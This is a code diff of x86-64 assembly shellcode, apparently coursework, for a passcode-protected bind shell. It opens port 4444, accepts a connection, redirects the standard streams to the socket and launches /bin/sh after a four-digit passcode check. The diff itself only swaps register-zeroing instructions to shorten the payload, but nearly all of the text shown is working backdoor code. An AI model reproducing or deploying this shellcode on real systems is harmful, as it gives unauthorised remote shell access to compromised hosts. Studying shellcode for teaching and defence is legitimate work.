@@ -21,15 +21,15 @@ _start:
         ; AF_INET = 2
         ; SOCK_STREAM = 1
         ; syscall number 41
-        xor rax, rax            ; init rax
+        xor eax, eax            ; init rax
         mov al, 41              ; syscall
 
-        xor rdi, rdi
+        xor edi, edi
         add di, 2
 
-        xor rsi, rsi
+        xor esi, esi
         inc rsi                 ; type
-        xor rdx, rdx            ; proto
+        xor edx, edx            ; proto
         syscall
 
         ; socket descriptor returned in rax
@@ -43,7 +43,7 @@ _start:
         ; server.sin_port = htons(PORT)
         ; server.sin_addr.s_addr = INADDR_ANY
         ; bzero(&server.sin_zero, 8)
-        xor rax, rax                            ; init eight bytes to 0
+        xor eax, eax                            ; init eight bytes to 0
         push rax                                ; 0x0000 0000 0000 0000
         mov dword [rsp-4], eax                  ; 0x0000 0000
         mov word [rsp-6], 0x5c11                ; 0x     5c11 0000 port 4444 in network byte order = 0x115c
@@ -55,27 +55,27 @@ _start:
         ; bind(sockfd, (struct sockaddr *)&server, sockaddr_len)
         ;      rdi      rsi                        rdx
         ; syscall number 49
-        xor rax, rax
+        xor eax, eax
         mov al, 49                              ; syscall bind
         ; rdi                                   ; sockfd
         mov rsi, rsp                            ; 0x0000 0000 5c11 0002
-        xor rdx, rdx
+        xor edx, edx
         mov dl, 16                              ; length of ?
         syscall
 
 
         ; listen(sock, MAX_CLIENTS)
         ; syscall number 50
-        xor rax, rax
+        xor eax, eax
         mov al, 50                              ; syscall listen
         ; rdi                                   ; sockfd
-        xor rsi, rsi
+        xor esi, esi
         add si, 2
         syscall
         ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
         ;              rdi    rsi                        rdx
         ; syscall number 43
-        xor rax, rax
+        xor eax, eax
         mov al, 43                              ; syscall accept
         sub rsp, 16                             ; ?
         ; rdi                                   ; sockfd
@@ -89,7 +89,7 @@ _start:
         mov r9, rax
 
         ; close parent
-        xor rax, rax
+        xor eax, eax
         add al, 3
         syscall
 
@@ -99,23 +99,23 @@ _start:
         ;The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the descriptor number spec
         ; -ified in newfd.  If the descriptor newfd was previously open, it is silently closed before being reused.
         ; dup2 (new, old)
-        xor rax, rax
+        xor eax, eax
         mov al, 33
         mov rdi, r9             ; oldfd
         xor rsi, rsi
         syscall
 
 
-        xor rax, rax
+        xor eax, eax
         mov al, 33
         ; rdi
-        xor rsi, rsi            ; newfd = std out
+        xor esi, esi            ; newfd = std out
         inc rsi
         syscall
-        xor rax, rax
+        xor eax, eax
         mov al, 33
         ; rdi
-        xor rsi, rsi
+        xor esi, esi
         add si, 2
         syscall
 
@@ -134,10 +134,10 @@ _start:
         push rbx
         push rcx
 
-        xor rax, rax
-        xor rdx, rdx
+        xor eax, eax
+        xor edx, edx
         mov al, 1
-        xor rdx, rdx
+        xor edx, edx
         add dl, 1
         mov rsi, rsp
         mov dl, 25                      ; $ echo "Enter 4 digit passcode: " | wc = 25
@@ -145,7 +145,7 @@ _start:
         ; *******************************************************
 
         ; *****get passcode **************************************
-        xor rax, rax                    ; you can use read 0 | recvfrom 45 | recvmsg 47
+        xor eax, eax                    ; you can use read 0 | recvfrom 45 | recvmsg 47
         mov rdi, r9                     ; sockfd
         mov rsi, rsp                    ; buffer - put it on the stack
         xor rdx, rdx
@@ -165,9 +165,9 @@ _start:
 
 _exit:
         ; _exit if wrong passcode ; alternatively, continue to ask for passcode
-        xor rax, rax
+        xor eax, eax
         mov al, 60
-        xor rdi, rdi
+        xor edi, edi
         syscall
         ; *******************************************************
 
@@ -175,7 +175,7 @@ _shell:
 
         ; execve *************************************
         ; First NULL push
-        xor rax, rax
+        xor eax, eax
         push rax
 
         ; push /bin//sh in reverse
